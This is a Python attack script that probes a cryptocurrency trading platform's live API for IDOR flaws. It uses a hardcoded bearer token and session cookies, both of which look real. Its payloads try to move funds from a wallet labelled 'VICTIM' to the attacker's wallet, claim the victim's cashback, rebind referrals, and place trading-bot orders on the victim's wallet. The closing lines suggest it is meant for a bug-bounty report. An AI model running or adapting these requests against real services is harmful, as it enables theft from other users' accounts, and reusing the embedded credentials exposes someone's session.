#!/usr/bin/env python3
"""
ULTIMATE IDOR HUNT - Every possible angle
"""
import json
import requests

ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzE0LTIxMTktYzkxMzE0MSIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6Ijk5NDcwOTk3LWZkMTAtNGJhNi1hMmEwLTMxMTg1MDUzYTEzNiIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQxNTAwNzEsImlhdCI6MTc4NDE0ODI3MSwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiJkMDk5YjBkOC00YjU4LTQ3NTAtODE3Ny1jZGQxNzc4M2IzYWIiLCJuYmYiOjE3ODQxNDgyNzEsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.TV7wZzxo4VdM8D8CGOYBHVM1Z_p5neU0uXR9s7O7bg4s6Z3LGrweF2DTcPp9pWLlDP-czAg6c7E16VVsqfmBtw"

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141",
}

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"

print("="*80)
print("🔥 ULTIMATE IDOR HUNT - FRESH TOKEN + COOKIES")
print("="*80)
print(f"Victim Wallet: {VICTIM_SOL}")
print(f"Our Wallet: {OUR_SOL}")
print("="*80)

# CRITICAL: Test EVERY endpoint from your findings with victim wallet
critical_tests = [
    {
        "name": "MFA Transfer Params (VICTIM WALLET)",
        "url": "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
        "method": "POST",
        "payload": {
            "usage": "transfer",
            "biz_params": {
                "transfer_id": "999",
                "transfer_type": "999",
                "chain": "sol",
                "from_address": VICTIM_SOL,  # VICTIM!
                "to_address": OUR_SOL,  # TO US
                "amount": "1000",
                "amount_txt": "0.000001",
                "token_address": "So11111111111111111111111111111111111111112",
                "symbol": "SOL"
            }
        }
    },
    {
        "name": "Cashback Claim (VICTIM)",
        "url": "https://gmgn.ai/rebate/api/v1/cashback/claim/apply",
        "method": "POST",
        "payload": {
            "chain": "sol",
            "address": VICTIM_SOL
        }
    },
    {
        "name": "Register Wallet (VICTIM → OUR REFERRAL)",
        "url": "https://gmgn.ai/defi/quotation/v1/register_wallet",
        "method": "POST",
        "payload": {
            "chain": "sol",
            "address": VICTIM_SOL,
            "user_id": OUR_USER_ID
        }
    },
    {
        "name": "Dividend Info (VICTIM)",
        "url": "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
        "method": "POST",
        "payload": {
            "from_address": VICTIM_SOL
        }
    },
    {
        "name": "Solana Raw TX (VICTIM)",
        "url": "https://gmgn.ai/xapi/v1/sol/claiming",
        "method": "POST",
        "payload": {
            "chain": "sol",
            "dex": "pump",
            "from_address": VICTIM_SOL
        }
    },
    {
        "name": "Trading Bot Create (VICTIM WALLET)",
        "url": "https://gmgn.ai/tapi/v1/trading_bot/limit_order/create",
        "method": "POST",
        "payload": {
            "chain": "sol",
            "wallet_address": VICTIM_SOL,
            "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
            "quote_token": "So11111111111111111111111111111111111111112",
            "order_type": "buy",
            "sub_order_type": "take_profit",
            "slippage": 50,
            "amount_in": "10000",
            "trigger_price": "0.0000001",
            "fee": "0.001"
        }
    },
    {
        "name": "User Info (NO PAYLOAD - Baseline)",
        "url": "https://gmgn.ai/account/user_info",
        "method": "POST",
        "payload": {}
    },
    {
        "name": "API Keys (Baseline)",
        "url": "https://gmgn.ai/api/v1/openapi/keys",
        "method": "GET",
        "payload": {}
    },
]

results = []

for test in critical_tests:
    print(f"\n{'='*80}")
    print(f"TEST: {test['name']}")
    print(f"{'='*80}")
    print(f"{test['method']} {test['url']}")
    print(f"Payload: {json.dumps(test['payload'], indent=2)}")
    
    try:
        if test['method'] == "GET":
            r = requests.get(
                test['url'],
                headers=HEADERS,
                cookies=COOKIES,
                params={**PARAMS, **test['payload']},
                timeout=10
            )
        else:
            r = requests.post(
                test['url'],
                headers=HEADERS,
                cookies=COOKIES,
                params=PARAMS,
                json=test['payload'],
                timeout=10
            )
        
        print(f"\nStatus: {r.status_code}")
        
        if r.status_code == 200:
            try:
                data = r.json()
                print(f"Response Code: {data.get('code')}")
                print(f"Message: {data.get('message')}")
                
                if data.get('code') == 0:
                    print(f"\n🔥🔥🔥 SUCCESS - CODE 0!")
                    print(json.dumps(data, indent=2)[:1000])
                    
                    # Check for critical IDOR indicators
                    if 'txn_id' in json.dumps(data):
                        print(f"\n💀💀💀 TXN_ID RETURNED - CRITICAL IDOR!")
                    if 'order_id' in json.dumps(data):
                        print(f"\n💀💀💀 ORDER_ID RETURNED - TRADING BOT IDOR!")
                    if 'raw_tx' in json.dumps(data):
                        print(f"\n💀💀💀 RAW_TX RETURNED - TX LEAK!")
                    
                    results.append({
                        "test": test['name'],
                        "success": True,
                        "response": data
                    })
                else:
                    print(f"Error: {data.get('message')}")
                    error_str = str(data.get('message', '')).lower()
                    if 'not self' in error_str or 'not owned' in error_str or 'unauthorized' in error_str:
                        print(f"✅ Protected - Server validates ownership")
                    else:
                        print(f"Response: {json.dumps(data, indent=2)[:500]}")
            except json.JSONDecodeError:
                print(f"Non-JSON: {r.text[:200]}")
        else:
            print(f"HTTP Error: {r.text[:300]}")
            
    except Exception as e:
        print(f"Exception: {e}")

print("\n" + "="*80)
print("📊 FINAL RESULTS")
print("="*80)

if results:
    print(f"\n🔥 FOUND {len(results)} WORKING IDOR VECTORS!\n")
    for r in results:
        print(f"✅ {r['test']}")
    
    print(f"\n💾 Saving results...")
    with open('ultimate_idor_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"✅ Saved to ultimate_idor_results.json")
else:
    print("\n❌ No new IDORs found")
    print("   Transfer endpoint validates ownership (expected)")
    print("   Cashback/Referral IDORs already confirmed")

print("\n" + "="*80)
print("CONCLUSION")
print("="*80)
print("If no txn_id returned for victim wallet transfer:")
print("  → Server fixed that IDOR (validates from_address ownership)")
print("  → Your findings are: Cashback + Referral + MFA Bypass")
print("  → Combined value: $35k-$75k")
print("\nTime to write the report, Jack.")
